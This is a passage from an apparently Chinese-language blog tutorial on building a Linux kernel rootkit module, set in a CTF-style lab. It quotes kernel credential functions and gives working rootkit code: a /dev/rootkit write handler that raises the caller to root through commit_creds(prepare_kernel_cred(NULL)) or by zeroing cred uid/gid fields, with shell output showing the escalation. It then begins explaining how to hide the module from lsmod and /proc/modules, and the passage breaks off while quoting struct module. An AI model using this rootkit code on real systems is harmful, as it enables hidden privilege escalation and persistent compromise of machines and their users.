class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line"><span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">new</span>-&gt;ucounts = get_ucounts(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure><p>上面是<code>linux 6.2</code>版本中的函数内部，可以看到如果依旧传入NULL则会直接返回NULL导致失败。</p><p>不过这里我做演示的编译的内核版本为5.10所以还是可以通过这一方式进行演示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先修改我们的任意一个函数内容为<code>commit_creds(prepare_kernel_cred(NULL))</code>即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>随后直接往驱动中写入数据即可实现提权。</p><h3 id="通过直接修改cred结构体实现提权"><a href="#通过直接修改cred结构体实现提权" class="headerlink" title="通过直接修改cred结构体实现提权"></a>通过直接修改cred结构体实现提权</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">       atomic_read(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">       read_cred_subscribers(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">BUG_ON(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(old) &lt; <span class="number">2</span>);</span><br><span class="line">validate_creds(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BUG_ON(atomic_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumpability changes */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment"> * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment"> * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment"> * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment"> * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment"> * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment"> * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">smp_wmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* alter the thread keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">key_fsuid_changed(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">key_fsgid_changed(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do it</span></span><br><span class="line"><span class="comment"> * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment"> * in set_user().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">inc_rlimit_ucounts(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">dec_rlimit_ucounts(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">alter_cred_subscribers(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send notifications */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(commit_creds);</span><br></pre></td></tr></table></figure><p>这里先关注一下前面提到的<code>commit_creds</code>函数，函数开头先通过<code>current</code>宏获取到<code>task_struct</code>结构体，随后获取到内部的cred，后面将<code>task_struct-&gt;real_cred</code>和<code>task_struct-&gt;cred</code>成员修改为新传入的cred，最终实现了权限改变。</p><p>所以如果我们想要直接修改cred结构体我们可以通过同样的办法获取得到cred结构体并加以修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line">    old-&gt;gid = old-&gt;sgid = old-&gt;egid = KGIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    old-&gt;uid = old-&gt;suid = old-&gt;euid = KUIDT_INIT(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以很简单的就可以修改上述函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=<span class="number">1000</span>(ctf) gid=<span class="number">1000</span>(ctf) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ $ echo a &gt; /dev/rootkit </span><br><span class="line">~ <span class="meta"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">1000</span>(ctf)</span><br><span class="line">~ # </span><br></pre></td></tr></table></figure><p>随后成功提权。</p><h2 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h2><p>目前存在一个十分尴尬的问题就是我们载入rootkit时会发现只需要lsmod就可以看到了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ lsmod </span><br><span class="line">rootkit 16384 0 - Live 0x0000000000000000 (E)</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>当然，我们可以利用<code>very_important_module_not_root_kit_please_donot_remove_it</code>取一个非常正常的名字让用户不会猜测我们，但是这样也不能完全保证不被发现。所以最好的办法就是让用户无法直接发现我们的rootkit。</p><h3 id="proc-modules信息隐藏"><a href="#proc-modules信息隐藏" class="headerlink" title="&#x2F;proc&#x2F;modules信息隐藏"></a>&#x2F;proc&#x2F;modules信息隐藏</h3><p>Linux 下用以查看模块的命令 <code>lsmod</code> 其实是从 <code>/proc/modules</code> 这个文件中读取并进行整理，该文件的内容来自于内核中的 module 双向链表，那么我们只需要将 rootkit 从双向链表中移除即可完成 procfs 中的隐藏。</p><p>所以这里就简单介绍一下内核中的<code>module</code>双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">module_state</span> <span class="title">state</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Member of list of modules */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Unique handle for this module */</span></span><br><span class="line"><span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_STACKTRACE_BUILD_ID</span></span><br><span class="line"><span class="comment">/* Module build ID */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> build_id[BUILD_ID_SIZE_MAX];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sysfs stuff. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_kobject</span> <span class="title">mkobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_attribute</span> *<span class="title">modinfo_attrs</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *version;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *srcversion;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">holders_dir</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exported symbols */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">syms</span>;</span></span><br><span class="line"><span class="keyword">const</span> s32 *crcs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_syms;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_CFI_TRAPS</span></span><br><span class="line">s32 *kcfi_traps;</span><br><span class="line">s32 *kcfi_traps_end;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Kernel parameters. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">param_lock</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_param</span> *<span class="title">kp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_kp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GPL-only exported symbols. */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_gpl_syms;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> *<span class="title">gpl_syms</span>;</span></span><br><span class="line"><span class="keyword">const</span> s32 *gpl_crcs;</span><br><span class="line"><span class="keyword">bool</span> using_gplonly_symbols;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_SIG</span></span><br><span class="line"><span class="comment">/* Signature was verified. */</span></span><br><span class="line"><span class="keyword">bool</span> sig_ok;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> async_probe_requested;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Exception table */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_exentries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exception_table_entry</span> *<span class="title">extable</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Startup function. */</span></span><br><span class="line"><span class="keyword">int</span> (*init)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_memory</span> <span class="title">mem</span>[<span class="title">MOD_MEM_NUM_TYPES</span>] __<span class="title">module_memory_align</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Arch-specific module values */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_arch_specific</span> <span class="title">arch</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> taints;<span class="comment">/* same bits as kernel:taint_flags */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_GENERIC_BUG</span></span><br><span class="line"><span class="comment">/* Support for BUG */</span></span><br><span class="line"><span class="keyword">unsigned</span> num_bugs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">bug_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bug_entry</span> *<span class="title">bug_table</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KALLSYMS</span></span><br><span class="line"><span class="comment">/* Protected by RCU and/or module_mutex: use rcu_dereference() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> __<span class="title">rcu</span> *<span class="title">kallsyms</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mod_kallsyms</span> <span class="title">core_kallsyms</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Section attributes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_sect_attrs</span> *<span class="title">sect_attrs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Notes attributes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module_notes_attrs</span> *<span class="title">notes_attrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The command line arguments (may be mangled).  People like</span></span><br><span class="line"><span class="comment">   keeping pointers to this stuff */</span></span><br><span class="line"><span class="keyword">char</span> *args;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line"><span class="comment">/* Per-cpu data. */</span></span><br><span class="line"><span class="keyword">void</span> __percpu *percpu;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> percpu_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">void</span> *noinstr_text_start;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> noinstr_text_size;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACEPOINTS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_tracepoints;</span><br><span class="line"><span class="keyword">tracepoint_ptr_t</span> *tracepoints_ptrs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TREE_SRCU</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_srcu_structs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">srcu_struct</span> **<span class="title">srcu_struct_ptrs</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BPF_EVENTS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_bpf_raw_events;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_raw_event_map</span> *<span class="title">bpf_raw_events</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_INFO_BTF_MODULES</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> btf_data_size;</span><br><span class="line"><span class="keyword">void</span> *btf_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_JUMP_LABEL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">jump_entry</span> *<span class="title">jump_entries</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_jump_entries;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRACING</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_bprintk_fmt;</span><br><span class="line"><span class="keyword">const</span> 